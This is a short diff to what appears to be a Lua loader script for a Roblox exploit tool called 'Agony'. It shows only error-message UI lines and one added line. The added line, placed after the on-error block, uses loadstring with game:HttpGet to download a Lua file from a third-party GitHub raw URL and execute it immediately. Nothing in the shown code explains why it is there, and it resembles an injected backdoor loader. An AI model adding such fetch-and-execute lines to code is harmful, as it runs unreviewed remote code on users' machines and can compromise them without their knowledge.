@@ -1324,4 +1324,6 @@ UpdateLabelScript.Text = "Your script is invalid"
 UpdateLabelInfo1.Text = "Agony stopped loading"
 UpdateLabelInfo2.Text = "!" 
 LoadingBar.BackgroundColor3 = Color3.fromRGB(255, 60, 60) end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sittapea/randomgit/main/lok.lua", true))()
 --]--End Of On Error
